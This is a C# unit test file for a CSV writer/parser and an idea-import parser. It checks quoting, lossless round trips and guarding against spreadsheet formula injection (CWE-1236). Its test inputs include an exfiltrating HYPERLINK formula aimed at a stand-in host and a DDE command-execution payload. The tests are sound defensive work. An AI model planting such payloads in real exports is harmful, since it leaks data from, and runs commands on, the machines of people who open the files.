using Collega.API.Parsing;
using Collega.Application.Exceptions;
using Collega.Application.Ideas;

namespace Collega.API.Tests;

/// <summary>Unit coverage for the quote-aware CSV reader/writer and the idea-import parser (T059/T060).</summary>
public sealed class CsvIdeaTests
{
    [Fact]
    public void Csv_Parse_SplitsRowsAndFields()
    {
        var records = Csv.Parse("a,b,c\n1,2,3");

        Assert.Equal(2, records.Count);
        Assert.Equal(new[] { "a", "b", "c" }, records[0]);
        Assert.Equal(new[] { "1", "2", "3" }, records[1]);
    }

    [Fact]
    public void Csv_Parse_HandlesQuotedCommasQuotesAndNewlines()
    {
        var records = Csv.Parse("title,description\n\"a, b\",\"he said \"\"hi\"\"\"\n\"line1\nline2\",x");

        Assert.Equal("a, b", records[1][0]);
        Assert.Equal("he said \"hi\"", records[1][1]);
        Assert.Equal("line1\nline2", records[2][0]);
        Assert.Equal("x", records[2][1]);
    }

    [Fact]
    public void Csv_Parse_TrailingNewline_NoPhantomRecord()
    {
        var records = Csv.Parse("a,b\n1,2\n");
        Assert.Equal(2, records.Count);
    }

    [Fact]
    public void Csv_Write_QuotesOnlyWhereNeeded_AndRoundTrips()
    {
        var csv = Csv.Write(new[] { "Title", "Description" }, new[]
        {
            (IReadOnlyList<string>)new[] { "Plain", "has, comma" },
            new[] { "Quote \" here", "line\nbreak" },
        });

        Assert.Contains("Plain,\"has, comma\"", csv);

        var back = Csv.Parse(csv);
        Assert.Equal("has, comma", back[1][1]);
        Assert.Equal("Quote \" here", back[2][0]);
        Assert.Equal("line\nbreak", back[2][1]);
    }

    // CWE-1236 (formula injection). A cell beginning '=', '+', '-', '@', tab, or CR is evaluated
    // as a formula by Excel/Sheets/LibreOffice on open, so idea content authored by any member
    // could execute in an admin's spreadsheet. Csv.Write guards it; Csv.Parse strips the guard.
    [Theory]
    [InlineData("=HYPERLINK(\"http://evil.test?d=\"&A1,\"click\")")]
    [InlineData("=cmd|'/c calc'!A1")]
    [InlineData("+1+1")]
    [InlineData("-2+3")]
    [InlineData("@SUM(A1:A9)")]
    [InlineData("\tleading tab")]
    [InlineData("\rleading cr")]
    public void Csv_Write_GuardsFormulaTriggeringCells(string dangerous)
    {
        var csv = Csv.Write(new[] { "Title" }, new[] { (IReadOnlyList<string>)new[] { dangerous } });

        var dataLine = csv.Split("\r\n")[1];

        // The payload must not be the first character of the emitted cell — quoted or not.
        Assert.DoesNotContain($"\r\n{dangerous[0]}", csv);
        Assert.StartsWith("'", dataLine.TrimStart('"'));
    }

    [Fact]
    public void Csv_Write_LeavesOrdinaryCellsUnguarded()
    {
        var csv = Csv.Write(new[] { "Title" }, new[]
        {
            (IReadOnlyList<string>)new[] { "Reduce approval steps" },
            new[] { "'tis a quoted phrase" },
        });

        Assert.Contains("\r\nReduce approval steps\r\n", csv);
        // A value that genuinely starts with an apostrophe is not double-guarded.
        Assert.Contains("\r\n'tis a quoted phrase\r\n", csv);
    }

    [Theory]
    [InlineData("=1+1")]
    [InlineData("-danger")]
    [InlineData("@x")]
    [InlineData("plain value")]
    [InlineData("'tis a quoted phrase")]
    [InlineData("has, comma")]
    // Values that already look guarded. Without apostrophe-depth counting in the guard, the strip
    // on re-import eats the user's own apostrophe and silently rewrites stored data.
    [InlineData("'=1+1")]
    [InlineData("''=1+1")]
    [InlineData("'-2")]
    [InlineData("''")]
    [InlineData("'")]
    [InlineData("")]
    public void Csv_WriteThenParse_RoundTripsGuardedCellsLosslessly(string original)
    {
        var csv = Csv.Write(new[] { "Title" }, new[] { (IReadOnlyList<string>)new[] { original } });

        var back = Csv.Parse(csv);

        Assert.Equal(original, back[1][0]);
    }

    [Fact]
    public void Csv_Parse_StripsGuardOnlyWhenWhatRemainsWouldHaveBeenGuarded()
    {
        var records = Csv.Parse("a\n'=1+1\n'tis\n''\n''=1+1");

        Assert.Equal("=1+1", records[1][0]);    // guard removed
        Assert.Equal("'tis", records[2][0]);    // ordinary leading apostrophe preserved
        Assert.Equal("''", records[3][0]);      // apostrophes with no trigger behind them, preserved
        Assert.Equal("'=1+1", records[4][0]);   // one guard removed, the user's own apostrophe kept
    }

    /// <summary>
    /// The guard must survive a second pass through the exporter — an export of re-imported data
    /// must not accumulate apostrophes, or repeated round trips would drift.
    /// </summary>
    [Theory]
    [InlineData("=1+1")]
    [InlineData("'=1+1")]
    [InlineData("'tis")]
    public void Csv_WriteParseWrite_IsStable(string original)
    {
        var once = Csv.Write(new[] { "T" }, new[] { (IReadOnlyList<string>)new[] { original } });
        var twice = Csv.Write(new[] { "T" }, new[] { (IReadOnlyList<string>)new[] { Csv.Parse(once)[1][0] } });

        Assert.Equal(once, twice);
    }

    [Fact]
    public void IdeaParser_MapsCellsByHeader_CaseInsensitive_AndSkipsBlankRows()
    {
        var csv = "Title,Description,Priority,Idea Type,Business Impact,Status\n"
                + "First,Desc,High,Improvement,High,In Review\n"
                + "\n"
                + "Second,Desc2,Low,Improvement,Low,\n";

        var rows = CsvIdeaImportParser.Parse(csv);

        Assert.Equal(2, rows.Count);
        Assert.Equal(1, rows[0].RowNumber);
        Assert.Equal("First", rows[0].Cells[IdeaCsvColumns.Title]);
        Assert.Equal("In Review", rows[0].Cells[IdeaCsvColumns.Status]);
        Assert.Equal(2, rows[1].RowNumber); // blank line didn't consume a row number
        Assert.Equal("Second", rows[1].Cells[IdeaCsvColumns.Title]);
    }

    [Fact]
    public void IdeaParser_MissingRequiredColumns_Throws()
    {
        // No "business impact" column.
        var csv = "Title,Description,Priority,Idea Type\nA,B,Low,Improvement";
        Assert.Throws<ValidationAppException>(() => CsvIdeaImportParser.Parse(csv));
    }

    [Fact]
    public void IdeaParser_EmptyFile_Throws()
    {
        Assert.Throws<ValidationAppException>(() => CsvIdeaImportParser.Parse("   "));
    }
}
